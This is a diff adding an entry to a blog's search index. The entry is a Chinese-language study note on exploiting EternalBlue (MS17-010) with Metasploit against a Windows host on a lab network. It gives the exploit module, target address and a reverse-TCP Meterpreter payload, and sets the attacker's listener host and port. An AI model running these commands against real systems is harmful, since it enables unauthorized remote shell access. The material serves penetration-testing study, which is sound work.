@@ -4,6 +4,19 @@
   
   
   <entry>
+    <title>网安学习笔记——MSF</title>
+    <link href="/2025/08/19/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94MSF/"/>
+    <url>/2025/08/19/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94MSF/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Metasploit-攻击永恒之蓝全流程"><a href="#Metasploit-攻击永恒之蓝全流程" class="headerlink" title="Metasploit 攻击永恒之蓝全流程"></a>Metasploit 攻击永恒之蓝全流程</h1><h2 id="一、流程概述"><a href="#一、流程概述" class="headerlink" title="一、流程概述"></a>一、流程概述</h2><p>利用 Metasploit 框架，通过永恒之蓝（<code>ms17_010_eternalblue</code> ）漏洞对目标 Windows 主机实施攻击，获取 Meterpreter 会话，实现后渗透测试，需合理配置攻击模块参数，涵盖目标与攻击方网络信息、攻击载荷等 。</p><h2 id="二、具体步骤"><a href="#二、具体步骤" class="headerlink" title="二、具体步骤"></a>二、具体步骤</h2><h3 id="（一）选择攻击模块"><a href="#（一）选择攻击模块" class="headerlink" title="（一）选择攻击模块"></a>（一）选择攻击模块</h3><p>在 Metasploit 中，调用永恒之蓝漏洞对应的攻击模块，命令如下：  </p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">use</span> exploit/windows/smb/ms17_010_eternalblue<br></code></pre></td></tr></table></figure><p>该模块针对 Windows SMB 服务，利用永恒之蓝漏洞发起攻击 。  </p><h3 id="（二）查看并配置必选项"><a href="#（二）查看并配置必选项" class="headerlink" title="（二）查看并配置必选项"></a>（二）查看并配置必选项</h3><ol><li><p><strong>查看必选参数</strong><br>  输入 <code>show options</code> 命令，筛选 <code>required</code> 为 <code>yes</code> 的配置项，明确需手动设置的参数，确保攻击流程完整 。  </p></li><li><p><strong>设置目标主机（RHOSTS）</strong><br>  命令：<code>set RHOSTS 192.168.1.128</code><br>  说明：<code>RHOSTS</code> 定义攻击目标，填写目标 Windows 主机的 IP 地址，指定要渗透的对象 。  </p></li><li><p><strong>设置攻击载荷（Payload）</strong><br>  命令：<code>set payload windows/x64/meterpreter/reverse_tcp</code><br>  说明：<code>payload</code> 决定攻击成功后的行为，选择此载荷可获取 <code>meterpreter</code> 交互环境，它是 Metasploit 后渗透阶段的核心工具，支持文件操作、权限提升等多种渗透动作 。</p></li></ol><p>  <img src="https://pic1.imgdb.cn/item/68a48e8058cb8da5c83a622c.png"></p><ol start="4"><li><strong>设置攻击方监听信息</strong>  <ul><li><strong>配置监听主机（LHOST）</strong><br> 命令：<code>set LHOST 192.168.1.136</code><br> 说明：<code>LHOST</code> 为攻击方（Kali 系统）的 IP 地址，用于接收目标主机回连的网络标识 。  </li><li><strong>配置监听端口（LPORT）</strong><br> 命令：<code>set LPORT 12345</code><br> 说明：<code>LPORT</code> 是攻击方在 Kali 上开启的监听端口（范围 1 - 65535 ，需未被系统占用 ），目标主机通过该端口与攻击方建立连接 。</li></ul></li></ol>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Metasploit Framework (MSF) 渗透测试工具指南</title>
     <link href="/2025/08/19/MSF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E6%8C%87%E5%8D%97/"/>
     <url>/2025/08/19/MSF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E6%8C%87%E5%8D%97/</url>
